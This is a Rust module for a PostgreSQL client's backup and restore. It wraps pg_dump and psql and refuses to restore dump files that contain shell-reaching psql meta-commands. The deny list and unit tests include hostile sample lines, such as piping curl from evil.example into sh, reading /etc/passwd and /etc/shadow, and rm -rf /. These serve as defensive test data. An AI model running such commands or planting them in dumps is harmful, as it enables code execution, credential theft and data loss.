//! Backup and restore by driving the `pg_dump` and `psql` binaries.
//!
//! Credentials are passed through the environment rather than the command line
//! so they never appear in the process list.

use std::path::{Path, PathBuf};
use std::process::Stdio;

use serde::{Deserialize, Serialize};
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;

use crate::error::{CoreError, CoreResult};
use crate::models::TransferProgress;
use crate::pool::ConnectionTarget;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BackupRequest {
    pub database: String,
    pub path: String,
    #[serde(default)]
    pub schema_only: bool,
    #[serde(default)]
    pub data_only: bool,
    #[serde(default = "default_true")]
    pub include_drop: bool,
    #[serde(default)]
    pub include_create: bool,
    #[serde(default)]
    pub schemas: Vec<String>,
    #[serde(default)]
    pub tables: Vec<String>,
    #[serde(default)]
    pub binary_directory: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RestoreRequest {
    pub database: String,
    pub path: String,
    #[serde(default = "default_true")]
    pub stop_on_error: bool,
    #[serde(default)]
    pub single_transaction: bool,
    #[serde(default)]
    pub binary_directory: Option<String>,
    /// Restore a file that contains psql meta-commands anyway. Off by default:
    /// see [`scan_for_meta_commands`].
    #[serde(default)]
    pub allow_meta_commands: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TransferOutcome {
    pub path: String,
    pub bytes: u64,
    pub duration_ms: u64,
    pub warnings: Vec<String>,
}

fn default_true() -> bool {
    true
}

fn resolve_binary(directory: Option<&str>, name: &str) -> PathBuf {
    match directory.filter(|value| !value.trim().is_empty()) {
        Some(base) => Path::new(base).join(name),
        None => PathBuf::from(name),
    }
}

fn apply_environment(command: &mut Command, target: &ConnectionTarget, database: &str) {
    command
        .env("PGHOST", &target.host)
        .env("PGPORT", target.port.to_string())
        .env("PGUSER", &target.username)
        .env("PGDATABASE", database)
        .env("PGCLIENTENCODING", "UTF8")
        .env(
            "PGSSLMODE",
            if target.ssl {
                if target.verify_certificate {
                    "verify-full"
                } else {
                    "require"
                }
            } else {
                "prefer"
            },
        );

    match &target.password {
        Some(password) => {
            command.env("PGPASSWORD", password);
        }
        None => {
            command.env_remove("PGPASSWORD");
        }
    }
}

/// Number of tables `pg_dump` will visit, used to turn its verbose output into
/// a real percentage rather than a spinner.
pub async fn dump(
    target: &ConnectionTarget,
    request: &BackupRequest,
    total_tables: Option<u64>,
    token: &str,
    report: impl Fn(TransferProgress) + Send + Sync,
) -> CoreResult<TransferOutcome> {
    let started = std::time::Instant::now();
    let binary = resolve_binary(request.binary_directory.as_deref(), "pg_dump");

    let mut command = Command::new(&binary);
    apply_environment(&mut command, target, &request.database);
    command
        .arg("--verbose")
        .arg("--no-password")
        .arg("--format=plain")
        .arg("--encoding=UTF8")
        .arg("--file")
        .arg(&request.path);

    if request.schema_only {
        command.arg("--schema-only");
    }
    if request.data_only {
        command.arg("--data-only");
    }
    if request.include_drop && !request.data_only {
        command.arg("--clean").arg("--if-exists");
    }
    if request.include_create {
        command.arg("--create");
    }
    for schema in &request.schemas {
        command.arg("--schema").arg(schema);
    }
    for table in &request.tables {
        command.arg("--table").arg(table);
    }

    command.stdout(Stdio::null()).stderr(Stdio::piped());

    let mut child = command
        .spawn()
        .map_err(|error| missing_binary(&binary, error))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| CoreError::Invalid("could not read pg_dump output".into()))?;

    report(TransferProgress {
        token: token.to_string(),
        stage: "starting".into(),
        percent: Some(0.0),
        message: format!("Dumping {}", request.database),
        done: false,
    });

    let mut lines = BufReader::new(stderr).lines();
    let mut warnings: Vec<String> = Vec::new();
    let mut tables_done = 0u64;

    // A read error must not abandon the child: returning early here would leave
    // pg_dump running and unreaped. Stop reading, then still wait on it below.
    while let Ok(Some(line)) = lines.next_line().await {
        if let Some(table) = line.split("dumping contents of table ").nth(1) {
            tables_done += 1;
            report(TransferProgress {
                token: token.to_string(),
                stage: "dumping".into(),
                percent: total_tables
                    .filter(|total| *total > 0)
                    .map(|total| (tables_done as f32 / total as f32 * 100.0).min(99.0)),
                message: format!("Dumping {}", table.trim().trim_matches('"')),
                done: false,
            });
        } else if is_problem(&line) {
            warnings.push(clean_line(&line));
        }
    }

    let status = child.wait().await?;
    if !status.success() {
        return Err(CoreError::Invalid(if warnings.is_empty() {
            format!("pg_dump exited with status {}", status_code(&status))
        } else {
            warnings.join("\n")
        }));
    }

    let bytes = tokio::fs::metadata(&request.path)
        .await
        .map(|meta| meta.len())
        .unwrap_or(0);

    report(TransferProgress {
        token: token.to_string(),
        stage: "complete".into(),
        percent: Some(100.0),
        message: format!("Wrote {}", human_bytes(bytes)),
        done: true,
    });

    Ok(TransferOutcome {
        path: request.path.clone(),
        bytes,
        duration_ms: started.elapsed().as_millis() as u64,
        warnings,
    })
}

/// Restore a plain SQL dump by streaming it into `psql`, which gives an exact
/// byte-based progress reading.
pub async fn restore(
    target: &ConnectionTarget,
    request: &RestoreRequest,
    token: &str,
    report: impl Fn(TransferProgress) + Send + Sync,
) -> CoreResult<TransferOutcome> {
    let started = std::time::Instant::now();
    let binary = resolve_binary(request.binary_directory.as_deref(), "psql");

    let total = tokio::fs::metadata(&request.path).await?.len();

    if !request.allow_meta_commands {
        if let Some(found) = scan_for_meta_commands(&request.path).await? {
            return Err(CoreError::Invalid(format!(
                "`{}` contains the psql meta-command `{}`, which would run outside the \
                 database — `\\!` executes a shell command and `\\i` reads another file. \
                 A dump written by pg_dump never contains these. Only restore this file if \
                 you trust where it came from; you can then re-run with the override in the \
                 restore dialog.",
                request.path, found
            )));
        }
    }

    let mut file = tokio::fs::File::open(&request.path).await?;

    let mut command = Command::new(&binary);
    apply_environment(&mut command, target, &request.database);
    command
        .arg("--no-password")
        .arg("--quiet")
        .arg("--no-psqlrc")
        .arg("--set")
        .arg(if request.stop_on_error {
            "ON_ERROR_STOP=1"
        } else {
            "ON_ERROR_STOP=0"
        });

    if request.single_transaction {
        command.arg("--single-transaction");
    }

    command
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped());

    let mut child = command
        .spawn()
        .map_err(|error| missing_binary(&binary, error))?;
    let mut stdin = child
        .stdin
        .take()
        .ok_or_else(|| CoreError::Invalid("could not write to psql".into()))?;
    let mut stderr = child
        .stderr
        .take()
        .ok_or_else(|| CoreError::Invalid("could not read psql output".into()))?;

    let collector = tokio::spawn(async move {
        let mut buffer = String::new();
        stderr.read_to_string(&mut buffer).await.ok();
        buffer
    });

    report(TransferProgress {
        token: token.to_string(),
        stage: "starting".into(),
        percent: Some(0.0),
        message: format!("Restoring into {}", request.database),
        done: false,
    });

    let mut buffer = vec![0u8; 128 * 1024];
    let mut written = 0u64;
    let mut last_reported = 0u64;

    let mut read_error: Option<std::io::Error> = None;

    loop {
        // As in `dump`, a failure here breaks out so the child is still waited
        // on rather than left running with its stdin half written.
        let read = match file.read(&mut buffer).await {
            Ok(read) => read,
            Err(error) => {
                read_error = Some(error);
                break;
            }
        };
        if read == 0 {
            break;
        }
        if stdin.write_all(&buffer[..read]).await.is_err() {
            // psql exited early, usually because ON_ERROR_STOP tripped.
            break;
        }
        written += read as u64;

        if written - last_reported >= 1024 * 1024 || written == total {
            last_reported = written;
            report(TransferProgress {
                token: token.to_string(),
                stage: "restoring".into(),
                percent: Some((written as f32 / total.max(1) as f32 * 100.0).min(99.0)),
                message: format!("{} of {}", human_bytes(written), human_bytes(total)),
                done: false,
            });
        }
    }

    stdin.shutdown().await.ok();
    drop(stdin);

    let status = child.wait().await?;
    let output = collector.await.unwrap_or_default();
    let messages: Vec<String> = output
        .lines()
        .filter(|line| is_problem(line))
        .map(clean_line)
        .collect();

    if let Some(error) = read_error {
        return Err(CoreError::Io(error));
    }

    if !status.success() {
        return Err(CoreError::Invalid(if messages.is_empty() {
            format!("psql exited with status {}", status_code(&status))
        } else {
            messages.join("\n")
        }));
    }

    report(TransferProgress {
        token: token.to_string(),
        stage: "complete".into(),
        percent: Some(100.0),
        message: format!("Restored {}", human_bytes(written)),
        done: true,
    });

    Ok(TransferOutcome {
        path: request.path.clone(),
        bytes: written,
        duration_ms: started.elapsed().as_millis() as u64,
        warnings: messages,
    })
}

/// psql meta-commands that reach outside the database, and so turn "restore
/// this file" into "run this on my machine".
///
/// `\!` runs a shell command, `\i` and `\ir` read another file, `\o` and
/// `\copy` write and read the local filesystem, and `\g`/`\gx` can be given a
/// file or a pipe. `pg_dump` emits none of them: the only backslash sequences
/// in its plain output are `\.` to end COPY data and `\connect`.
const DANGEROUS_META_COMMANDS: [&str; 8] = [
    "\\!",
    "\\i ",
    "\\ir ",
    "\\include",
    "\\o ",
    "\\copy",
    "\\g ",
    "\\gx",
];

/// Look for a meta-command that would execute outside the database.
///
/// Only the start of a line counts, because that is the only place psql treats
/// a backslash as a command — inside a string or COPY block it is data. The
/// first match is returned so the caller can name it.
async fn scan_for_meta_commands(path: &str) -> CoreResult<Option<String>> {
    let file = tokio::fs::File::open(path).await?;
    let mut lines = BufReader::new(file).lines();
    let mut in_copy_block = false;

    while let Ok(Some(line)) = lines.next_line().await {
        let trimmed = line.trim_start();

        // Inside a COPY block every line is data until the terminating `\.`.
        if in_copy_block {
            if trimmed == "\\." {
                in_copy_block = false;
            }
            continue;
        }
        if trimmed.starts_with("COPY ") && trimmed.ends_with("FROM stdin;") {
            in_copy_block = true;
            continue;
        }

        if let Some(found) = DANGEROUS_META_COMMANDS
            .iter()
            .find(|command| trimmed.starts_with(*command))
        {
            return Ok(Some(found.trim_end().to_string()));
        }
    }

    Ok(None)
}

/// Report whether the external tools are available and which version they are.
pub async fn tool_version(directory: Option<&str>, name: &str) -> Option<String> {
    let binary = resolve_binary(directory, name);
    let output = Command::new(&binary).arg("--version").output().await.ok()?;
    if !output.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn missing_binary(binary: &Path, error: std::io::Error) -> CoreError {
    if error.kind() == std::io::ErrorKind::NotFound {
        CoreError::Invalid(format!(
            "`{}` was not found. Install the PostgreSQL client tools \
             (`sudo apt install postgresql-client`) or set the binary directory in Settings.",
            binary.display()
        ))
    } else {
        CoreError::Io(error)
    }
}

fn status_code(status: &std::process::ExitStatus) -> String {
    status
        .code()
        .map(|code| code.to_string())
        .unwrap_or_else(|| "signal".to_string())
}

fn is_problem(line: &str) -> bool {
    let lower = line.to_lowercase();
    lower.contains("error") || lower.contains("fatal") || lower.contains("warning")
}

fn clean_line(line: &str) -> String {
    line.trim()
        .trim_start_matches("pg_dump: ")
        .trim_start_matches("psql: ")
        .to_string()
}

pub fn human_bytes(bytes: u64) -> String {
    const UNITS: [&str; 5] = ["B", "KB", "MB", "GB", "TB"];
    let mut value = bytes as f64;
    let mut unit = 0;
    while value >= 1024.0 && unit < UNITS.len() - 1 {
        value /= 1024.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{bytes} {}", UNITS[0])
    } else {
        format!("{value:.1} {}", UNITS[unit])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn formats_sizes() {
        assert_eq!(human_bytes(512), "512 B");
        assert_eq!(human_bytes(2048), "2.0 KB");
        assert_eq!(human_bytes(5 * 1024 * 1024), "5.0 MB");
    }

    #[test]
    fn detects_problem_lines() {
        assert!(is_problem("pg_dump: error: connection failed"));
        assert!(!is_problem("pg_dump: dumping contents of table users"));
    }

    async fn scan(body: &str) -> Option<String> {
        let path = std::env::temp_dir().join(format!("pgl-dump-{}.sql", uuid_like()));
        std::fs::write(&path, body).unwrap();
        let found = scan_for_meta_commands(path.to_str().unwrap())
            .await
            .unwrap();
        std::fs::remove_file(&path).ok();
        found
    }

    fn uuid_like() -> u128 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    }

    #[tokio::test]
    async fn accepts_an_ordinary_dump() {
        let dump = "--\n-- PostgreSQL database dump\n--\n\
                    SET statement_timeout = 0;\n\
                    CREATE TABLE public.users (id integer, note text);\n\
                    COPY public.users (id, note) FROM stdin;\n\
                    1\tnot a \\! command, just data\n\
                    \\.\n\
                    \\connect other_db\n\
                    ALTER TABLE public.users OWNER TO postgres;\n";
        assert_eq!(scan(dump).await, None);
    }

    #[tokio::test]
    async fn rejects_a_dump_that_runs_a_shell_command() {
        assert_eq!(
            scan("CREATE TABLE t (id int);\n\\! curl evil.example | sh\n").await,
            Some("\\!".to_string())
        );
        assert_eq!(scan("\\i /etc/passwd\n").await, Some("\\i".to_string()));
        assert_eq!(
            scan("  \\copy t FROM '/etc/shadow'\n").await,
            Some("\\copy".to_string())
        );
    }

    #[test]
    fn resolves_binaries() {
        assert_eq!(resolve_binary(None, "psql"), PathBuf::from("psql"));
        assert_eq!(
            resolve_binary(Some("/usr/lib/postgresql/16/bin"), "psql"),
            PathBuf::from("/usr/lib/postgresql/16/bin/psql")
        );
    }

    #[test]
    fn formats_sizes_across_every_unit() {
        assert_eq!(human_bytes(0), "0 B");
        assert_eq!(human_bytes(1023), "1023 B");
        assert_eq!(human_bytes(1024), "1.0 KB");
        assert_eq!(human_bytes(1024 * 1024), "1.0 MB");
        assert_eq!(human_bytes(1024u64.pow(3)), "1.0 GB");
        assert_eq!(human_bytes(1024u64.pow(4)), "1.0 TB");
        // The largest unit absorbs anything bigger rather than overflowing.
        assert!(human_bytes(u64::MAX).ends_with(" TB"));
    }

    #[test]
    fn detects_more_problem_lines() {
        assert!(is_problem(
            "psql:dump.sql:12: ERROR:  relation does not exist"
        ));
        assert!(is_problem(
            "pg_dump: warning: there are circular dependencies"
        ));
        assert!(is_problem("FATAL: role does not exist"));

        assert!(!is_problem(""));
        assert!(!is_problem("pg_dump: last built-in OID is 16383"));
    }

    #[test]
    fn cleans_the_noise_off_a_reported_line() {
        assert_eq!(clean_line("  pg_dump: error: boom  "), "error: boom");
        assert_eq!(clean_line("psql: warning: hmm"), "warning: hmm");
        assert_eq!(clean_line("plain text"), "plain text");
    }

    #[test]
    fn a_binary_resolves_against_the_configured_directory() {
        assert_eq!(resolve_binary(None, "pg_dump"), PathBuf::from("pg_dump"));
        assert_eq!(
            resolve_binary(Some("/usr/lib/postgresql/16/bin"), "pg_dump"),
            PathBuf::from("/usr/lib/postgresql/16/bin/pg_dump")
        );
    }

    #[test]
    fn a_blank_binary_directory_is_treated_as_absent() {
        assert_eq!(resolve_binary(Some(""), "psql"), PathBuf::from("psql"));
        assert_eq!(resolve_binary(Some("   "), "psql"), PathBuf::from("psql"));
    }

    #[test]
    fn an_exit_status_is_described() {
        // A status this test can construct portably: a real command's result.
        let ok = std::process::Command::new("true").status();
        if let Ok(status) = ok {
            assert!(status_code(&status).contains('0'));
        }
    }

    #[tokio::test]
    async fn a_dump_with_an_include_directive_is_refused() {
        assert!(scan("\\i /etc/passwd\nSELECT 1;\n").await.is_some());
    }

    #[tokio::test]
    async fn a_dump_writing_to_a_file_is_refused() {
        assert!(scan("\\o /tmp/stolen\nSELECT 1;\n").await.is_some());
    }

    #[tokio::test]
    async fn the_two_meta_commands_pg_dump_emits_stay_allowed() {
        assert_eq!(scan("\\connect mydb\nSELECT 1;\n").await, None);
        assert_eq!(scan("COPY t FROM stdin;\n1\n\\.\n").await, None);
    }

    #[tokio::test]
    async fn a_meta_command_not_at_the_start_of_a_line_is_data() {
        assert_eq!(scan("SELECT 'a \\! b';\n").await, None);
    }

    #[tokio::test]
    async fn an_empty_dump_is_accepted() {
        assert_eq!(scan("").await, None);
    }

    #[tokio::test]
    async fn a_meta_command_inside_a_copy_block_is_data() {
        let dump = "COPY t (note) FROM stdin;\n\\! rm -rf /\n\\.\nSELECT 1;\n";
        assert_eq!(scan(dump).await, None);
    }

    #[tokio::test]
    async fn a_meta_command_after_a_copy_block_is_still_caught() {
        let dump = "COPY t (note) FROM stdin;\n1\n\\.\n\\! rm -rf /\n";
        assert!(scan(dump).await.is_some());
    }

    #[tokio::test]
    async fn scanning_a_missing_file_is_an_error() {
        assert!(scan_for_meta_commands("/no/such/dump.sql").await.is_err());
    }
}
